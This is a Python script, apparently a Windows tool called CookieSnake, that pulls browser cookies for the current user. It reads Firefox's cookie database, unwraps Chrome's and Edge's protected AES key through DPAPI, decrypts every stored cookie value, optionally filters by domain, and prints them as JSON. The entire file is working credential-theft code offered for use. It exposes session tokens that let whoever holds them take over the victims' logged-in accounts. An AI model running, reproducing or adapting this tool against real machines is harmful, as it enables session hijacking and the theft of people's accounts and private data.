import argparse
import hashlib
import json
import sqlite3
import time
import win32crypt
from base64 import b64decode
from pathlib import Path
from pprint import pprint
from sys import platform
from typing import List
from Crypto.Cipher import AES

if platform != "win32":
    print("CookieSnake only works on Windows!")
    exit()

def _dict_factory(cursor, row):
    milliseconds = ["expiry"]
    utc = ["lastAccessed", "creationTime"]
    chromium_utc = ["expires_utc"]
    d = {}
    
    for idx, col in enumerate(cursor.description):
        if col[0] in milliseconds:
            d[col[0]] = time.strftime(r'%m/%d/%Y %H:%M:%S',  time.gmtime(row[idx]/1000.))
        elif col[0] in utc:
            d[col[0]] = time.strftime(r'%m/%d/%Y %H:%M:%S',  time.gmtime(row[idx]/1000000.))
        elif col[0] in chromium_utc:
            # If Chromimum epoch value, convert. Otherwise, leave value alone.
            try:
                d[col[0]] = time.strftime(r'%m/%d/%Y %H:%M:%S',  time.gmtime(row[idx]/1000000 - 11644473600))
            except:
                d[col[0]] = row[idx]
        else:
            d[col[0]] = row[idx]
    return d

def _mergeResults(ff: list, edge: list, chrome: list):
    browsers = list(filter(lambda x: len(x), [ff, edge, chrome]))
    results = [browser for browser in browsers]
    return json.dumps(results, indent=4, sort_keys=True)

def decryptChromiumCookie(key, value) -> str:
    """Decrypts cookie values that have been encrypted by a Chromium-based browser.
    Supports Edge v80+ and Chrome.
    
    Args:
        key: The DPAPI-unecrypted value of the key found in the Local State file.
        value: The encrypted value of the cookie found in the Cookies sqlite DB.
    
    Returns:
        An unencrypted Chromium cookie.
    """
    # Encrypted data starts with "v10". Nonce is 12 bytes, then blob, then 16 byte auth tag.
    nonce = value[3:15]
    enc = value[15:-16]
    tag = value[-16:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(enc, tag).decode()

def getFirefoxCookies(domains: list) -> list:
    """Gathers Firefox Cookies.
    
    Args:
        domains: List of domain to filter.
    
    Returns:
        An list of users and their Firefox cookies.
    """
    moz_cookie_dict = {"Firefox": []}
    user = Path.home()
    for profile in Path(f"{user}\AppData\Roaming\Mozilla\Firefox\Profiles").glob("*"):
        pro_name = profile.parts[-1]
        username = user.parts[-1]
        cookie_path = profile / "cookies.sqlite"
        
        if cookie_path.exists():
            conn = sqlite3.connect(cookie_path)
            conn.row_factory = _dict_factory
            cursor = conn.cursor()
            
            profile_dict = {str(pro_name): []}

            for row in cursor.execute("Select host,path,name,value,expiry from moz_cookies"):
                if domains:
                    for domain in domains:
                        if row["host"] == domain or row["host"].endswith(f".{domain}"):
                            profile_dict[pro_name].append(row)
                            break                                
                else:
                    profile_dict[pro_name].append(row)

            moz_cookie_dict["Firefox"].append(profile_dict)
    return moz_cookie_dict

def getChromiumCookies(domains: list, browser: str):
    """Gathers Chromium-based Cookies.
    
    Args:
        domains: List of domain to filter.
        browser: Supported values: Edge, Chrome.
    Returns:
        An list of users and their Chromium-based cookies.
    """

    if browser == "Edge":
        COOKIE_PATH = r"AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
        STATE_PATH = r"AppData\Local\Microsoft\Edge\User Data\Local State"
    elif browser == "Chrome":
        COOKIE_PATH = r"AppData\Local\Google\Chrome\User Data\Default\Cookies"
        STATE_PATH = r"AppData\Local\Google\Chrome\User Data\Local State"

    chr_cookie_dict = {browser: []}
    user = Path.home()

    cookie_path = user / COOKIE_PATH
    state_path = user / STATE_PATH
    username = user.parts[-1]

    if cookie_path.exists():
        conn = sqlite3.connect(cookie_path)
        conn.row_factory = _dict_factory
        cursor = conn.cursor()
        
        cookie_list = []

        # Cookies are AES-256 encrypted. Key is DPAPI encrypted.
        enc_key = json.load(open(state_path))["os_crypt"]["encrypted_key"]
        dpapied_key = b64decode(enc_key)
        decrypted_key = win32crypt.CryptUnprotectData(dpapied_key[5:], None, None, None, 0)[1]
        # print(decrypted_key)
        # print(dpapied_key)

        for row in cursor.execute("Select host_key,path,name,encrypted_value AS value,expires_utc from cookies"):
            if domains:
                for domain in domains:
                    if row["host_key"] == domain or row["host_key"].endswith(f".{domain}"):
                        row["value"] = decryptChromiumCookie(decrypted_key, row["value"])
                        cookie_list.append(row)
                        break
            else:
                row["value"] = decryptChromiumCookie(decrypted_key, row["value"])
                cookie_list.append(row)
            
        chr_cookie_dict[browser] = cookie_list
    return chr_cookie_dict

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', action='store_true', help="Grab Firefox cookies")
    parser.add_argument('-c', action='store_true', help="Grab Chrome (v80+) cookies")
    parser.add_argument('-e', action='store_true', help="Grab Edge (v80+) cookies")
    parser.add_argument('-d', metavar='', default='', help="Filter cookies by domain. [Usage: -d google.com,microsoft.com]")

    args = parser.parse_args()
    domains = args.d.split(",") if args.d else []

    if not any([args.f, args.c, args.e]):
        print("You must use at least one of the following arguments: -f, -c, -e.\n")
        exit()

    ff = getFirefoxCookies(domains) if args.f else []    
    edge = getChromiumCookies(domains, browser="Edge") if args.e else []
    chrome = getChromiumCookies(domains, browser="Chrome") if args.c else []
    print(_mergeResults(ff, edge, chrome))